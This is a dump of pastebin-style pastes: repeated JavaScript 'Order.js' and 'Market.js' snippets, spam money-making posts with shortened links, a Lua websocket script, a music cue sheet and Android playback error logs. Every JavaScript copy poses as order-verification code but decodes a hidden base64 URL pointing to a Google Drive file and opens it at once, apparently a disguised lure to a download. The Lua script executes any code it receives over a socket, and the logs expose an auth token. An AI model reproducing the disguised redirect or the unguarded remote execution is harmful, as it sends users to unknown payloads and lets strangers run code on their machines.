id,title,username,language,date,content
RGgUwDwz,Market.js,kammex,JavaScript,Thursday 17th of April 2025 01:05:48 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/74815/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9yiwSDKD,Untitled,kammex,JavaScript,Thursday 17th of April 2025 12:50:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23897/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FGzrY2hj,EARN $900 INSTANTLY 2025 2U,shdfkjash,JavaScript,Thursday 17th of April 2025 12:45:10 PM CDT," 
Pdf https://tinyurl.com/privguidee


AGHlfX6q4K
"
shMNzLpS,Products.js,kammex,JavaScript,Thursday 17th of April 2025 12:34:40 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69488/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HJ0r7Erc,Make $1000 15-MINUTES (BEGINNER) FM,shdfkjash,JavaScript,Thursday 17th of April 2025 12:31:42 PM CDT," 
Pdf https://tinyurl.com/privguidee


AZ2eTG8jiC
"
d7fkTMVJ,Order.js,kammex,JavaScript,Thursday 17th of April 2025 12:19:18 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/50482/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pJJcNccX,Make $1000 15-MINUTES (BEGINNER) FM,harry98569,JavaScript,Thursday 17th of April 2025 12:08:09 PM CDT," 
Pdf https://tinyurl.com/privguidee


OCPptBIAr9
"
Q4xz6ncz,Market.js,kammex,JavaScript,Thursday 17th of April 2025 12:03:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/52155/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
d9JR8EKH,Untitled,kammex,JavaScript,Thursday 17th of April 2025 11:38:08 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/43627/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
J03799kp,Order.js,kammex,JavaScript,Thursday 17th of April 2025 11:07:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45316/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nXz5w3L5,Market.js,kammex,JavaScript,Thursday 17th of April 2025 10:51:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/59167/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Jy5rQWEV,Untitled,kammex,JavaScript,Thursday 17th of April 2025 10:36:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/11648/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6PZDJEyF,Debbie Gibson - Electric Youth.cue,mjb,Cuesheet,Thursday 17th of April 2025 10:12:10 AM CDT,"REM DISCID 4908B706
PERFORMER ""Debbie Gibson""
TITLE ""Electric Youth""
REM DATE 1989
REM COMMENT ""7 81932-2""
FILE ""Debbie Gibson - Electric Youth.flac"" WAVE
  TRACK 01 AUDIO
    PERFORMER ""Debbie Gibson""
    TITLE ""Electric Youth (Deep House Mix)""
    INDEX 00 00:00:00
    INDEX 01 00:00:32
  TRACK 02 AUDIO
    PERFORMER ""Debbie Gibson""
    TITLE ""Electric Youth (Shep's House Dub)""
    INDEX 00 07:35:37
    INDEX 01 07:35:62
  TRACK 03 AUDIO
    PERFORMER ""Debbie Gibson""
    TITLE ""Electric Youth (7-inch Version)""
    INDEX 00 13:30:70
    INDEX 01 13:31:12
  TRACK 04 AUDIO
    PERFORMER ""Debbie Gibson""
    TITLE ""Electric Youth (The Electro Mix)""
    INDEX 00 18:26:35
    INDEX 01 18:29:10
  TRACK 05 AUDIO
    PERFORMER ""Debbie Gibson""
    TITLE ""Electric Youth (The Electric Dub Gone Haywire)""
    INDEX 01 25:04:62
  TRACK 06 AUDIO
    PERFORMER ""Debbie Gibson""
    TITLE ""We Could Be Together (Campfire Mix)""
    INDEX 00 31:36:55
    INDEX 01 31:37:52
"
ngMMmrwW,Order.js,dentira,JavaScript,Thursday 17th of April 2025 09:20:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05904/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PPivtrLT,Untitled,Wzrdwastaken,Lua,Thursday 17th of April 2025 09:12:02 AM CDT,"function websocket()
    local ws, err = http.websocket(""ws://localhost:8080/turtle"")

    if err then
        print(err)
    elseif ws then
        while true do
            local message = ws.receive()
            if message == nil then
                break
            end
            local func = loadstring(message)
            local result = func()
            ws.send(result)
        end
    end
end
websocket()"
Nr3e4X80,Market.js,dentira,JavaScript,Thursday 17th of April 2025 09:05:15 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25890/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Cgpf0gMA,Untitled,dentira,JavaScript,Thursday 17th of April 2025 08:49:09 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05084/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
n8P9NyvJ,2025-04-17T18:48:50.004458,powerampache,PHP,Thursday 17th of April 2025 08:48:50 AM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":28},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":144873066,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d9db5b87c5c2ed7a506342a9a2d4432d4\u0026type\u003dsong\u0026id\u003d50502"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
rNjeEzrB,2025-04-17T18:48:49.705913,powerampache,PHP,Thursday 17th of April 2025 08:48:50 AM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":28},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":144872809,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d9db5b87c5c2ed7a506342a9a2d4432d4\u0026type\u003dsong\u0026id\u003d50502"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
fyVXEyGM,2025-04-17T18:48:49.439229,powerampache,PHP,Thursday 17th of April 2025 08:48:50 AM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

